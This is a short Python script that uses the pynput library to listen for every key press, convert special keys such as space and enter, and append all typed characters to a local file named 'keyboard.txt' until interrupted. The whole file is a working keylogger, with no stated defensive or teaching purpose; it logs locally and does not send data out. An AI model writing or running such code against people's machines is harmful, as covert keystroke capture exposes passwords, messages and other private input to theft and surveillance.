from pynput.keyboard import Controller, Listener

try:
    def write_file(key):
        letter = str(key)
        letter = letter.replace("'", "")

        if letter == 'Key.backspace':
            letter = ""

        if letter == 'Key.shift':
            letter = ""

        if letter == 'Key.space':
            letter = " "

        if letter == 'Key.alt':
            letter = ""

        if letter == 'Key.tab':
            letter = ""

        elif letter == 'Key.enter':
            letter = "\n"

        # print(letter)
        with open("keyboard.txt", 'a') as f:
            f.write(letter)
    with Listener(on_press=write_file) as l:
        l.join()

except KeyboardInterrupt:
    print("You terminate the program")
